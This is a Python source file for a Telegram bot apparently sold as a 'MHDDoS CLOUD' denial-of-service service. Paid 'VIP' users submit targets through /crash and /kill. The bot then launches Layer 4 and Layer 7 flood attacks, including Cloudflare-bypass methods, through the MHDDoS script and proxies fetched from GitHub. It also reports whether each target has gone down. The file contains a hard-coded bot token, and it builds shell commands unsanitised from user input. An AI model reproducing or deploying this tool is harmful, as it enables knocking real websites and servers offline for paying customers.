import telebot
import os
import signal
import subprocess
import requests
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Telegram Bot Token
TOKEN = "7104470318:AAF9426v-kxZVa34pA7jrXJP4xne6wCJk_E"
bot = telebot.TeleBot(TOKEN)

# Allowed Admins
ALLOWED_USERS = [5705487207]

# VIP Users and tracking
vip_users = {}
active_attacks = {}

# Standard Proxy URL (SOCKS5/SOCKS4/HTTP)
PROXY_URL = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"

def check_target_status(target):
    """Checks if the target is responding or down."""
    try:
        if not target.startswith("http"):
            target = f"http://{target.split(':')[0]}"
        
        start_time = time.time()
        response = requests.get(target, timeout=5)
        end_time = time.time()
        
        if response.status_code == 200:
            return f"UP ✅ ({int((end_time - start_time) * 1000)}ms)"
        else:
            return f"UNSTABLE ⚠️ (Code: {response.status_code})"
    except:
        return "DOWN 💀 (No Response)"

@bot.message_handler(commands=['start'])
def handle_start_command(message):
    try:
        user_id = message.from_user.id
        days_left = vip_users.get(user_id, 0)
        status = "VIP MEMBER" if days_left > 0 else "REGULAR USER"

        text = (
            f"🤖 *WELCOME TO MHDDoS CLOUD*\n\n"
            f"> *USER ID:* `{user_id}`\n"
            f"> *STATUS:* `{status}`\n"
            f"> *EXPIRY:* `{days_left} Days`\n\n"
            f"📌 *COMMAND USAGE:*\n"
            f"<blockquote>/crash <METHOD> <IP:PORT> <THREADS> <MS></blockquote>\n"
            f"<blockquote>/kill <URL> (Auto Proxy L7)</blockquote>\n\n"
            f"💡 *PRO TIP:* Use `CFB` for Cloudflare sites\."
        )

        markup = InlineKeyboardMarkup()
        creator_button = InlineKeyboardButton("📱 CREATOR", url="https://t.me/MR3SKR")
        methods_button = InlineKeyboardButton("📜 METHODS LIST", callback_data="show_methods")
        markup.add(creator_button, methods_button)

        bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        print(f"Error: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "show_methods")
def show_methods(call):
    methods_text = (
        f"🛡️ *MHDDoS POWER METHODS*\n\n"
        f"🚀 *LAYER 7 (Web Browsers):*\n"
        f"<blockquote>CFB, CFBUAM, BYPASS, GET, POST, OVH, STOMP, SLOW</blockquote>\n\n"
        f"⚔️ *LAYER 4 (Servers/IPs):*\n"
        f"<blockquote>UDP, TCP, SYN, VSE, CONNECTION, MINECRAFT, TS3</blockquote>\n\n"
        f"🔗 *PROXIES:* Automatically fetched from GitHub\."
    )
    markup = InlineKeyboardMarkup()
    back_btn = InlineKeyboardButton("⬅️ BACK", callback_data="back_to_start")
    markup.add(back_btn)
    
    bot.edit_message_text(methods_text, chat_id=call.message.chat.id, 
                          message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "back_to_start")
def back_to_start(call):
    handle_start_command(call.message)

@bot.message_handler(commands=['crash'])
def handle_crash_command(message):
    try:
        user_id = message.from_user.id
        if vip_users.get(user_id, 0) <= 0:
            bot.reply_to(message, "🚫 *ACCESS DENIED:* VIP STATUS REQUIRED!")
            return

        parts = message.text.split()
        if len(parts) < 5:
            bot.reply_to(message, "⚠️ *USAGE:* `/crash <METHOD> <IP:PORT> <THREADS> <MS>`")
            return

        method, target, threads, duration = parts[1:5]
        
        # Checking target status before attack
        initial_status = check_target_status(target)

        # Logic: If proxy file not found, MHDDoS downloads it automatically
        # We pass 5 as socks_type (SOCKS5) and the URL for proxylist
        command = f"python3 start.py {method} {target} 5 {threads} {PROXY_URL} 10 {duration}"
        
        process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)
        
        if user_id not in active_attacks: active_attacks[user_id] = {}
        active_attacks[user_id][target] = process

        response = (
            f"🚀 *ATTACK DEPLOYED*\n\n"
            f"> *TARGET:* `{target}`\n"
            f"> *METHOD:* `{method}`\n"
            f"> *STATUS:* {initial_status}\n"
            f"> *PROXIES:* `Fetching from URL...`\n\n"
            f"🔴 *STOP THE ATTACK USING BUTTON BELOW*"
        )

        markup = InlineKeyboardMarkup()
        stop_btn = InlineKeyboardButton("🛑 STOP ATTACK", callback_data=f"stop_{target}")
        markup.add(stop_btn)

        bot.send_message(message.chat.id, response, reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"SYSTEM ERROR: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
def stop_attack(call):
    user_id = call.from_user.id
    target = call.data.replace("stop_", "")

    if user_id in active_attacks and target in active_attacks[user_id]:
        process = active_attacks[user_id][target]
        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
        del active_attacks[user_id][target]
        bot.answer_callback_query(call.id, "ATTACK TERMINATED")
        bot.send_message(call.message.chat.id, f"🛑 *ATTACK STOPPED:* `{target}`", parse_mode="Markdown")
    else:
        bot.answer_callback_query(call.id, "NO ACTIVE ATTACK FOUND")

@bot.message_handler(commands=['kill'])
def handle_kill_command(message):
    # Layer 7 Auto-Killer
    try:
        user_id = message.from_user.id
        if vip_users.get(user_id, 0) <= 0: return
        
        parts = message.text.split()
        if len(parts) != 2: return
        
        target_url = parts[1]
        # Command with Auto-Proxying
        cmd = f"python3 start.py KILLER {target_url} 5 100 {PROXY_URL} 100 300"
        subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)
        
        bot.reply_to(message, f"✅ *L7 KILLER STARTED*\n\n> *URL:* {target_url}\n> *PROXIES:* Auto-downloading...", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"ERROR: {str(e)}")

@bot.message_handler(commands=['addvip'])
def handle_addvip_command(message):
    if message.from_user.id not in ALLOWED_USERS: return
    try:
        _, t_id, days = message.text.split()
        vip_users[int(t_id)] = int(days)
        bot.reply_to(message, f"⭐ *VIP SUCCESS:* User `{t_id}` added for `{days}` days\.")
    except:
        bot.reply_to(message, "⚠️ `/addvip <ID> <DAYS>`")

print("BOT DEPLOYED ON COOLIFY...")
bot.remove_webhook()
bot.polling(none_stop=True)
